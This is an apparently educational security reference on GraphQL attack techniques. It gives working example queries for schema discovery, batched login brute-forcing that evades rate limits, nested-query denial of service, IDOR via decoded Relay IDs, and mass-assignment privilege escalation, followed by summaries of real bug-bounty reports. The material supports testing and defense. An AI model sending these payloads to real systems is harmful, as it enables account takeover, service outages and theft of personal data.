GraphQL Security

GraphQL特有のアタックサーフェス: Introspection、Batching、Nested Query DoS、 Resolver-level authorization bypass。HackerOne自身のIDOR $12,500等の高額報告多数。

1. Introspection & Schema Discovery

Full Introspection Query

{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    mutationType { fields { name } }
    queryType { fields { name } }
  }
}

When Introspection is Disabled

多くのproductionサーバはintrospectionを無効化している。代替手法:

Field Suggestion Attack

// Query with typo
{ users { userna } }

// Error response reveals suggestions:
// "Did you mean 'username', 'usernames', 'user_name'?"
// → Field names leaked via error messages

Error-based Discovery

// Test field existence
{ user(id: 1) { password } }
// "Field 'password' not found on type 'User'" → type name confirmed

// Enumerate fields with wordlist
{ user(id: 1) { secret_key } }
{ user(id: 1) { api_token } }
{ user(id: 1) { internal_notes } }
// Fields that DON'T return "not found" exist but may be forbidden

Tools for Schema Discovery

  • clairvoyance: Automated field name brute-forcing
  • graphw00f: GraphQL engine fingerprinting
  • InQL: Burp extension for GraphQL testing
  • graphql-voyager: Schema visualization

2. Batching Attacks

Brute-force via Array Queries

// Single request, 1000 login attempts (bypasses rate limiting)
[
  {"query": "mutation { login(email:\"test@x.com\", password:\"pass001\") { token } }"},
  {"query": "mutation { login(email:\"test@x.com\", password:\"pass002\") { token } }"},
  {"query": "mutation { login(email:\"test@x.com\", password:\"pass003\") { token } }"},
  // ... 997 more
]
// Server processes all in single HTTP request → rate limit counts as 1

Aliased Batching (single query body)

query {
  a1: login(email: "test@x.com", password: "pass001") { token }
  a2: login(email: "test@x.com", password: "pass002") { token }
  a3: login(email: "test@x.com", password: "pass003") { token }
  # ... hundreds of aliases in one query
}
Rate Limit Bypass の本質

RESTでは1リクエスト=1操作だが、GraphQLでは1リクエスト内に複数操作を含められる。 Rate limitingがHTTPリクエスト単位の場合、GraphQL batchingで完全bypass。

3. Nested Query DoS

// Circular relationship exploitation
query {
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author { # ... 100 levels deep
                id
              }
            }
          }
        }
      }
    }
  }
}
// Exponential database queries (N+1 problem amplified)
// Without depth/complexity limits → server OOM / timeout

Detection of Limits

// Test progressively deeper nesting
// Depth 5: OK
// Depth 10: OK
// Depth 15: "Query depth exceeds maximum" → limit found
// Some servers use complexity scoring instead of pure depth

4. Authorization Bypass

Per-Resolver vs Global Authorization

// Common mistake: top-level resolver has auth check
// But nested resolvers inherit parent context without re-checking

query {
  myProfile {  # Checks: is user authenticated? ✓
    organization {  # No additional check
      allMembers {  # Should check: is user admin? ✗ (MISSING)
        email
        phone
        salary  # Sensitive field exposed
      }
    }
  }
}

IDOR via Node/Relay Global IDs

// Relay-style global IDs: base64 encoded type:id
// "User:123" → base64 → "VXNlcjoxMjM="

query {
  node(id: "VXNlcjoxMjM=") {  # My user
    ... on User { email phone }
  }
}

// Change ID: "User:456" → "VXNlcjo0NTY="
query {
  node(id: "VXNlcjo0NTY=") {  # Another user → IDOR
    ... on User { email phone ssn }
  }
}
Global ID の罠

Relay global IDは一見不透明だが、base64デコードで構造が分かる。 atob("VXNlcjoxMjM=") → "User:123"。 Sequential IDなら全ユーザ列挙可能。

5. Mutations: Mass Assignment

// Normal profile update
mutation {
  updateProfile(input: { name: "New Name" }) { id name }
}

// Mass assignment attempt
mutation {
  updateProfile(input: {
    name: "Hacker"
    role: "admin"           # ← hidden field
    is_verified: true       # ← hidden field
    credit_balance: 99999   # ← hidden field
  }) { id name role }
}
// If input type includes these fields without validation → privilege escalation

Discovery: Introspect Input Types

{
  __type(name: "UpdateProfileInput") {
    inputFields {
      name
      type { name }
    }
  }
}
// Reveals ALL accepted fields including undocumented ones

Real-World Reports

HackerOne IDOR via GraphQL Mutation - #2122671 ($12,500)

HackerOne自身のGraphQL APIにおいて、CreateOrUpdateHackerCertification mutation を利用して 別ユーザの Licenses/Certifications を削除可能な IDOR。 Mutation の ownership check 不備を突いた破壊的操作。

Shopify Billing IDOR via GraphQL Query - #2207248 ($5,000)

ShopifyのGraphQL query (BillingDocumentDownload, BillDetails) 経由で 他ストアの課金情報を閲覧可能。Query resolver の ownership check が不足していた。

GitLab: GraphQL Information Disclosure

Private repositoryのissue/MR情報がGraphQL nested queryから漏洩。 REST APIでは適切にブロックされていたがGraphQL resolverに同等の制御がなかった。
